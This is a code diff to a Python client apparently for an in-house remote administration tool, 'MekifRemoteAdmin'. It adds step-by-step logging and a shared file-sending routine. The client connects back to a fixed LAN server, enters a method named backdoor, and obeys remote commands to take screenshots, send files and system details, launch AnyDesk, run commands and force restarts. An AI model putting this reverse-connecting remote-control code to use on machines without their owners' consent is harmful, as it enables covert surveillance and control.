@@ -15,7 +15,8 @@ import os
 
 
 class Client:
-    def __init__(self, server, main_path):
+    def __init__(self, server, main_path, log_path):
+        self.log_path = log_path
         self.main_path = main_path
         self.server_host = server[0]
         self.server_port = server[1]
@@ -65,12 +66,14 @@ class Client:
         pass
 
     def screenshot(self):
-        self.d = datetime.now().replace(microsecond=0)
-        self.dt = str(self.d.strftime("%b %d %Y"))
-        self.fulldt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
+        self.logIt(logfile=log_path, debug=True, msg='Starting screenshot()')
+        self.logIt(logfile=log_path, debug=True, msg='Configuring file name & path')
+        dt = self.get_date()
         self.filename = \
-            rf"c:\MekifRemoteAdmin\screenshot {self.hostname} {str(self.localIP)} {self.fulldt}.jpg"
+            rf"c:\MekifRemoteAdmin\screenshot {self.hostname} {str(self.localIP)} {dt}.jpg"
+        self.logIt(logfile=log_path, debug=True, msg='Define chunk size')
         self.chunk = 40960000
+        self.logIt(logfile=log_path, debug=True, msg='Create powershell script file')
         self.path = rf'c:\MekifRemoteAdmin\screenshot.ps1'
         with open(self.path, 'w') as file:
             file.write("Add-Type -AssemblyName System.Windows.Forms\n")
@@ -87,22 +90,28 @@ class Client:
 
         time.sleep(0.2)
 
+        self.logIt(logfile=log_path, debug=True, msg='Running Screenshot script')
         ps = subprocess.Popen(["powershell.exe", rf"{self.path}"], stdout=sys.stdout)
         ps.communicate()
         try:
             # Send filename to server
+            self.logIt(logfile=log_path, debug=True, msg='Sending file name to server')
             soc.send(f"{self.filename}".encode())
 
             # Receive filename Confirmation from the server
+            self.logIt(logfile=log_path, debug=True, msg='Waiting for confirmation from server')
             msg = soc.recv(self.chunk).decode()
-            print(f"@Server: {msg}")
+            self.logIt(logfile=log_path, debug=True, msg=f'Server confirmation: {msg}')
+            self.logIt(logfile=log_path, debug=True, msg=f'Get file size')
             length = os.path.getsize(self.filename)
-            print(f"SC Size: {length}")
+            self.logIt(logfile=log_path, debug=True, msg=f'Send file size to server')
             soc.send(convert_to_bytes(length))
 
             # Send file content
+            self.logIt(logfile=log_path, debug=True, msg=f'Opening file with read bytes attributes ')
             with open(self.filename, 'rb') as img_file:
                 img_data = img_file.read(1024)
+                self.logIt(logfile=log_path, debug=True, msg=f'Sending file content')
                 while img_data:
                     soc.send(img_data)
                     if not img_data:
@@ -114,9 +123,12 @@ class Client:
             return False
 
         # Send Confirmation to server
+        self.logIt(logfile=log_path, debug=True, msg=f'Send confirmation')
         soc.send(f"{self.hostname} | {self.localIP}: Screenshot Completed.\n".encode())
+        self.logIt(logfile=log_path, debug=True, msg=f'Remove file')
         os.remove(self.filename)
         os.remove(self.path)
+        self.logIt(logfile=log_path, debug=True, msg=f'=== End of screenshot() ===')
 
     def system_information(self):
         def command_to_file():
@@ -193,6 +205,45 @@ class Client:
 
         return dt
 
+    def send_file(self, filename):
+        def send_file_name():
+            try:
+                soc.send(filename.encode())
+                msg = soc.recv(1024).decode()
+                print(msg)
+                return True
+
+            except (WindowsError, socket.error):
+                return False
+
+        def send_file_size():
+            length = os.path.getsize(filename)
+            print(f"PSFile Size: {length}")
+            try:
+                soc.send(convert_to_bytes(length))
+                return length
+
+            except (WindowsError, socket.error):
+                return False
+
+        def send_file_content():
+            try:
+                with open(filename, 'rb') as file:
+                    data = file.read(1024)
+                    while data:
+                        soc.send(data)
+                        if not data:
+                            break
+
+                        data = file.read(1024)
+
+            except (FileNotFoundError, FileExistsError):
+                return False
+
+        send_file_name()
+        send_file_size()
+        send_file_content()
+
     def execute(self, platform, cmd):
         dt = self.get_date()
         filename = rf"c:\MekifRemoteAdmin\{platform} {self.hostname} {str(self.localIP)} {dt}.txt"
@@ -248,9 +299,7 @@ class Client:
             soc.send(f"{self.hostname} | {self.localIP}: Command: {cmd} Completed.\n".encode())
 
         run_command()
-        send_file_name()
-        send_file_size()
-        send_file_content()
+        self.send_file(filename)
         confirm()
         os.remove(filename)
 
@@ -381,14 +430,17 @@ class Client:
                 # Send Computer Name to Server
                 ident = self.hostname
                 try:
+                    self.logIt(logfile=log_path, debug=True, msg='Sending self.hostname')
                     soc.send(ident.encode())
 
                 except (WindowsError, socket.error):
+                    self.logIt(logfile=log_path, debug=True, msg='Connection Error')
                     return False
 
             def send_current_user():
                 user = self.current_user
                 try:
+                    self.logIt(logfile=log_path, debug=True, msg=f'Sending current user: {user}')
                     soc.send(user.encode())
 
                 except (WindowsError, socket.error):
@@ -397,19 +449,25 @@ class Client:
             def confirm():
                 # Wait For Message
                 try:
+                    self.logIt(logfile=log_path, debug=True, msg='Wait for confirmation from server')
                     message = soc.recv(self.buffer_size).decode()
-                    print(f"{colored(message, 'green')}")
+                    self.logIt(logfile=log_path, debug=True, msg=f'Message from server: {message}')
 
                 except (WindowsError, socket.error):
                     return False
 
+            self.logIt(logfile=log_path, debug=True, msg='Calling send_host_name')
             send_host_name()
+            self.logIt(logfile=log_path, debug=True, msg='Calling send_current_user')
             send_current_user()
+            self.logIt(logfile=log_path, debug=True, msg='Calling confirm')
             confirm()
 
         def main_menu():
+            self.logIt(logfile=log_path, debug=True, msg='Starting main menu')
             while True:
                 try:
+                    self.logIt(logfile=log_path, debug=True, msg='Waiting for command')
                     command = soc.recv(self.buffer_size).decode()
 
                 except (ConnectionResetError, ConnectionError,
@@ -418,16 +476,19 @@ class Client:
 
                 try:
                     if len(str(command)) == 0:
-                        print(colored("[!]Disconnected!", 'red'))
+                        self.logIt(logfile=log_path, debug=True, msg='Connection Lost')
                         break
 
                     # Freestyle
                     if str(command).lower() == "freestyle":
+                        self.logIt(logfile=log_path, debug=True, msg='Calling freestyle')
                         self.free_style()
 
                     # Vital Signs
                     if str(command).lower() == "alive":
+                        self.logIt(logfile=log_path, debug=True, msg='Calling Vital Signs')
                         try:
+                            self.logIt(logfile=log_path, debug=True, msg='Answer yes to server')
                             soc.send('yes'.encode())
 
                         except socket.error:
@@ -435,19 +496,20 @@ class Client:
 
                     # Capture Screenshot
                     elif str(command.lower()[:6]) == "screen":
+                        self.logIt(logfile=log_path, debug=True, msg='Calling screenshot')
                         self.screenshot()
 
                     # Get System Information & Users
                     elif str(command.lower()[:2]) == "si":
-                        dt = self.get_date()
+                        self.logIt(logfile=log_path, debug=True, msg='Calling system information')
                         self.system_information()
 
                     # Get Last Restart Time
                     elif str(command).lower()[:2] == "lr":
-                        self.d = datetime.now().replace(microsecond=0)
-                        self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
+                        self.logIt(logfile=log_path, debug=True, msg='Fetching last restart time')
                         last_reboot = psutil.boot_time()
                         try:
+                            self.logIt(logfile=log_path, debug=True, msg='Sending last restart time')
                             soc.send(f"{self.hostname} | {self.localIP}: "
                                      f"{datetime.fromtimestamp(last_reboot).replace(microsecond=0)}".encode())
 
@@ -458,9 +520,8 @@ class Client:
 
                     # Get Current Logged-on User
                     elif str(command).lower()[:4] == "user":
-                        self.d = datetime.now().replace(microsecond=0)
-                        self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                         try:
+                            self.logIt(logfile=log_path, debug=True, msg='Sending current logged user')
                             soc.send(f"{self.hostname} | {self.localIP}: Current User: {self.current_user}.\n".encode())
                             continue
 
@@ -469,27 +530,23 @@ class Client:
 
                     # Run Anydesk
                     elif str(command.lower()[:7]) == "anydesk":
-                        self.d = datetime.now().replace(microsecond=0)
-                        self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
+                        self.logIt(logfile=log_path, debug=True, msg='Calling anydesk')
                         self.anydesk()
                         continue
 
                     # Task List
-                    elif (str(command.lower())) == "tasks":
-                        dt = self.get_date()
+                    elif (str(command.lower())[:5]) == "tasks":
+                        self.logIt(logfile=log_path, debug=True, msg='Calling tasks')
                         self.tasks()
 
                     # Restart Machine
                     elif str(command.lower()[:7]) == "restart":
-                        self.d = datetime.now().replace(microsecond=0)
-                        self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
+                        self.logIt(logfile=log_path, debug=True, msg='Restarting local station')
                         os.system('shutdown /r /t 1')
 
                     # Close Connection
-                    elif str(command.lower()) == "exit":
-                        self.d = datetime.now().replace(microsecond=0)
-                        self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
-                        print('[!]Connection closed by server.')
+                    elif str(command.lower()[:4]) == "exit":
+                        self.logIt(logfile=log_path, debug=True, msg='Server closed the connection')
                         soc.settimeout(1)
                         break
 
@@ -498,8 +555,30 @@ class Client:
                 except (Exception, socket.error) as err:
                     break
 
+        self.logIt(logfile=log_path, debug=True, msg='Calling intro()')
         intro()
+        self.logIt(logfile=log_path, debug=True, msg='Calling main_menu()')
         main_menu()
+
+    def logIt(self, logfile=None, debug=None, msg=''):
+        dt = self.get_date()
+        if debug:
+            print(f"{dt}: {msg}")
+
+        if logfile is not None:
+            try:
+                if not os.path.exists(logfile):
+                    with open(logfile, 'w') as lf:
+                        lf.write(f"{dt}: {msg}\n")
+                        return True
+
+                else:
+                    with open(logfile, 'a') as lf:
+                        lf.write(f"{dt}: {msg}\n")
+                    return True
+
+            except FileExistsError:
+                pass
 
 
 def convert_to_bytes(no):
@@ -522,24 +601,31 @@ if __name__ == "__main__":
     client_version = "1.0.0"
     task_list = []
     mekif_path = r'c:\MekifRemoteAdmin'
+    log_path = r'c:\MekifRemoteAdmin\log.txt'
     servers = [('192.168.1.10', 55400)]
 
     # Start Client
     while True:
         for server in servers:
-            client = Client(server, mekif_path)
-            time.sleep(0.5)
+            client = Client(server, mekif_path, log_path)
+
             try:
+                client.logIt(logfile=log_path, debug=True, msg='Creating Socket')
                 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                client.logIt(logfile=log_path, debug=True, msg='Set socket to Reuse address')
                 soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                client.logIt(logfile=log_path, debug=True, msg=f'connecting to {server}')
                 soc.connect(server)
+                client.logIt(logfile=log_path, debug=True, msg=f'Starting backdoor')
                 client.backdoor(soc)
 
-            except socket.error as e:
-                print(e)
+            except (WindowsError, socket.error) as e:
+                client.logIt(logfile=log_path, debug=True, msg=f'{e}')
                 soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                client.logIt(logfile=log_path, debug=True, msg=f'Closing socket')
                 soc.close()
 
         soc = socket.socket()
         soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        client.logIt(logfile=log_path, debug=True, msg='Closing socket')
         soc.close()
